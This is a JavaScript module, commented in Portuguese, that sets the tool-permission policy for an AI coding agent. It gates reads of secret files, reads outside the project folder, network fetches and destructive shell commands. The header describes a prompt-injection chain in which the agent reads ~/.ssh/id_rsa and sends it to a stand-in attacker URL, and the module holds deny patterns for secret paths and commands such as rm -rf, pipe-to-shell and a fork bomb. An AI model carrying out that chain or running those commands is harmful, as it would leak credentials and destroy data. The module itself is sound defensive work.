import * as path from "node:path";

/**
 * A política de permissão do motor "Claude Code (assinatura)" — a parte que decide, separada
 * da que fala com o SDK.
 *
 * ## Por que existe como módulo (achado F-13, e F-29 no mesmo movimento)
 *
 * O `claude-runner.mjs` roda ao ser importado, então nada dentro dele era testável: a única
 * prova era o `scripts/prova-montar-prompt.mjs`, que **extrai funções do fonte por regex** e
 * as reexecuta com `new Function` — passa hoje e emudece na primeira mudança de assinatura.
 * A política de permissão, que é a fronteira de segurança desta casca, não tinha prova
 * nenhuma. Aqui ela tem, e o teste é `node --test politica.test.mjs`.
 *
 * ## O que ela fecha
 *
 * `Read` de qualquer caminho e `WebFetch` para qualquer URL eram **automáticos**. Uma injeção
 * de prompt num arquivo do projeto compunha `Read ~/.ssh/id_rsa` → `WebFetch
 * https://atacante/?d=…` sem um cartão de aprovação. O outro motor da mesma casca — o `anna` —
 * mantém `curl`/`wget` fora do automático e tem denylist de segredos; o comentário do runner
 * diz que "um motor não pode ser a porta dos fundos do outro", e era exatamente o que ele era.
 */

/**
 * A denylist de segredos do `anna` (`guard::denied`), na mesma forma — os dois motores
 * recusam a mesma lista.
 *
 * Confinar na pasta do projeto não basta: o `.env` do próprio projeto está dentro dela, e é
 * o primeiro arquivo que uma injeção de prompt vai pedir.
 */
export function caminhoProibido(p) {
  const alvo = String(p ?? "").replace(/\\/g, "/").toLowerCase();
  if (alvo === "") return false;
  const base = alvo.split("/").filter(Boolean).pop() ?? alvo;
  if (base === ".git" || alvo.includes("/.git/") || alvo.startsWith(".git/")) return true;
  if (base === ".env" || (base.startsWith(".env.") && base !== ".env.example")) return true;
  if (/\.(pem|key|p8|p12|pfx)$/.test(base)) return true;
  if (base.startsWith("id_rsa") || base.startsWith("id_ed25519")) return true;
  return alvo.includes("credentials") || alvo.includes("/.ssh/") || alvo.includes("/.aws/");
}

/**
 * O caminho pedido está dentro da pasta do projeto?
 *
 * O `cwd` do SDK já confina as ferramentas de arquivo; esta é a nossa cerca, e ela existe
 * porque a política desta casca é código nosso — depender só do comportamento do SDK seria
 * delegar a fronteira para fora, que é o oposto do que o cartão de aprovação promete.
 *
 * Sem caminho declarado devolve `true`: a ferramenta não disse onde vai mexer, então não há
 * o que conferir aqui e quem decide é o `cwd`. Inventar recusa sobre ausência de dado seria
 * pedir cartão para toda listagem sem argumento.
 */
export function dentroDoProjeto(projectDir, p) {
  if (p === undefined || p === null || p === "") return true;
  const raiz = path.resolve(projectDir);
  const abs = path.resolve(projectDir, String(p));
  return abs === raiz || abs.startsWith(raiz + path.sep);
}

/**
 * Comando que o nível `auto` NÃO engole — a mesma lista de destrutivos do `anna`, onde o
 * "sempre confirma" vale mesmo com o atalho ligado (lá a regra se chama "`t` não vale").
 * Sem isto, `--aprovacao auto` liberava `rm -rf` e `git push --force` sem cartão enquanto o
 * outro motor da mesma casca recusava.
 */
export function comandoDestrutivo(cmd) {
  const c = String(cmd ?? "").toLowerCase();
  return /rm\s+-(rf|fr|r\s+-f)/.test(c)
    || c.includes("git push")
    || c.includes("git reset --hard")
    || c.includes("git clean -fd")
    || c.includes("git clean -df")
    || c.includes("mkfs")
    || /(^|\s)dd\s/.test(c)
    || /chmod\s+-r\s+777/.test(c)
    || c.includes("chmod 777 -r")
    || /\|\s*(sh|bash)\b/.test(c)
    || c.includes("drop table")
    || c.includes("truncate table")
    || c.includes(":(){");
}

/** Ferramentas de leitura cujo alvo é um CAMINHO — as que a cerca confina. */
export const PATH_ARG = {
  Read: "file_path",
  Glob: "path",
  Grep: "path",
  LS: "path",
  NotebookRead: "notebook_path",
};

/**
 * O veredito, em uma função pura — é ela que o teste exercita e o runner obedece.
 *
 * Devolve `{ acao: "allow"|"gate", motivo }`. Nunca `deny`: o que esta política não libera
 * vira **cartão**, não recusa — quem nega é o dev, olhando o preview.
 */
export function decidir({ projectDir, toolName, toolInput = {}, nivel = "manual", leitura, edicao }) {
  if (leitura.has(toolName)) {
    const alvo = toolInput[PATH_ARG[toolName]];
    if (caminhoProibido(alvo)) return { acao: "gate", motivo: `leitura de caminho protegido (${alvo})` };
    if (!dentroDoProjeto(projectDir, alvo)) return { acao: "gate", motivo: `leitura fora da pasta do projeto (${alvo})` };
    return { acao: "allow", motivo: "leitura (auto)" };
  }
  if (toolName === "WebFetch" || toolName === "WebSearch") {
    return { acao: "gate", motivo: "saída para a rede" };
  }
  if (toolName === "Bash" && comandoDestrutivo(toolInput.command)) {
    return { acao: "gate", motivo: "comando destrutivo" };
  }
  if (nivel !== "manual" && edicao.has(toolName)) {
    return { acao: "allow", motivo: `edição liberada pelo nível "${nivel}"` };
  }
  if (nivel === "auto") {
    return { acao: "allow", motivo: 'liberado pelo nível "auto"' };
  }
  return { acao: "gate", motivo: "" };
}
